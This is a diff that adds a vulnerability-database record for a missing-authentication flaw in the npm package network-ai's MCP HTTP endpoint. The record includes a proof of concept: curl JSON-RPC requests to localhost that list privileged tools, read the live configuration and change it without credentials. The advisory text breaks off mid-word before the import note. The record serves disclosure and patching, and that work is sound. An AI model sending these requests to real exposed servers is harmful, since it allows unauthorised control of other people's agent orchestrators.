@@ -1,0 +1,58 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0225",
+  "modified": "2026-05-13T14:34:44.953089Z",
+  "published": "2026-05-05T17:25:37Z",
+  "aliases": [
+    "GHSA-fj4g-2p96-q6m3",
+    "CVE-2026-42856"
+  ],
+  "summary": "Network-AI missing authentication on MCP HTTP endpoint, which allows unauthenticated privileged tool calls",
+  "details": "# Security Advisory: Missing Authentication for Critical Function in `Jovancoding/Network-AI`\n\n| Field | Value |\n|---|---|\n| Project | `Jovancoding/Network-AI` |\n| Repository | https://github.com/Jovancoding/Network-AI |\n| Affected commit | `c344f2053eb0d49395988f803bf92f2a86b2a0d0` |\n| Affected tested version | `5.1.2` |\n| Vulnerability type | CWE-306: Missing Authentication for Critical Function |\n| Severity | High |\n| Authentication required | None |\n| Default network exposure | Bind address `0.0.0.0` |\n| Reporter validation date | 2026-04-21 |\n\n## Summary\n\nThe MCP HTTP transport accepts JSON-RPC `tools/call` requests with no authentication, session, origin, or token check, and dispatches them directly to the orchestrator's tool registry. The default bind address is `0.0.0.0`. As a result, any party with network reachability to the service can enumerate and invoke privileged management tools — including reading and mutating the live orchestrator configuration, listing registered agents, dispatching agents, creating/revoking security tokens, and adjusting global budget ceilings.\n\n## Affected Code\n\n- `bin/mcp-server.ts:75` — server binds to `0.0.0.0` by default.\n- `lib/mcp-transport-sse.ts:155` — `handleRPC()` dispatches `tools/call` directly to the provider's `call(toolName, toolArgs)`.\n- `lib/mcp-transport-sse.ts:379` — `_handlePost()` parses the JSON-RPC body and calls `this._bridge.handleRPC(rpc)` with no auth check.\n- `lib/mcp-tools-control.ts:80` — `config_get` exposes live runtime configuration.\n- `lib/mcp-tools-control.ts:197` — `agent_list` exposes registered agents.\n- `lib/mcp-tools-control.ts:231` — `config_set` mutates runtime configuration in place: `this._config[key] = parsed`.\n\n## Proof of Concept\n\nThe PoC was executed against a local Docker build of the affected commit, bound to `http://localhost:13001`. **No authentication header was sent.** All inner-JSON excerpts below are decoded from the JSON-RPC `result.content[0].text` field for readability; the raw wire transcripts (which contain the literal escaped JSON-RPC envelope) are in `evidence/`.\n\n### Step 1 — list exposed tools (unauthenticated)\n\n```bash\ncurl http://localhost:13001/tools\n```\n\n`HTTP/1.1 200 OK` — body returned 22 tools. Privileged tools observed in the inventory include:\n\n- `config_get`, `config_set` — read and mutate live orchestrator configuration\n- `agent_list`, `agent_spawn`, `agent_stop` — enumerate, dispatch, and stop agents\n- `token_create`, `token_revoke` — mint and revoke security tokens\n- `budget_set_ceiling` — adjust the global token budget ceiling\n- `fsm_transition` — drive finite-state-machine transitions\n- `blackboard_write`, `blackboard_delete` — mutate the shared blackboard\n\nFull transcript: `evidence/01_get_tools.txt`.\n\n### Step 2 — read live configuration (unauthenticated)\n\n```bash\ncurl http://localhost:13001/mcp \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"config_get\",\"arguments\":{}}}'\n```\n\n`HTTP/1.1 200 OK` — decoded inner JSON:\n\n```json\n{\n  \"ok\": true,\n  \"tool\": \"config_get\",\n  \"data\": {\n    \"blackboardPath\": \"./swarm-blackboard.md\",\n    \"maxParallelAgents\": null,\n    \"defaultTimeout\": 30000,\n    \"enableTracing\": true,\n    \"grantTokenTTL\": 300000,\n    \"maxBlackboardValueSize\": 1048576,\n    \"auditLogPath\": \"./data/audit_log.jsonl\",\n    \"trustConfigPath\": \"./data/trust_levels.json\"\n  }\n}\n```\n\nFull transcript: `evidence/02_config_get_before.txt`.\n\n### Step 3 — mutate live configuration (unauthenticated)\n\n```bash\ncurl http://localhost:13001/mcp \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"config_set\",\"arguments\":{\"key\":\"defaultTimeout\",\"value\":\"12345\"}}}'\n```\n\n`HTTP/1.1 200 OK` — decoded inner JSON:\n\n```json\n{\n  \"ok\": true,\n  \"tool\": \"config_set\",\n  \"data\": {\n    \"key\": \"defaultTimeout\",\n    \"previous\": 30000,\n    \"current\": 12345,\n    \"applied\": true\n  }\n}\n```\n\nFull transcript: `evidence/03_conf\n\nImported from OSV GHSA-fj4g-2p96-q6m3.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-fj4g-2p96-q6m3"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-fj4g-2p96-q6m3"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42856"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Jovancoding/Network-AI"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "network-ai"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "5.1.3"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "package",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "high"
+  }
+}
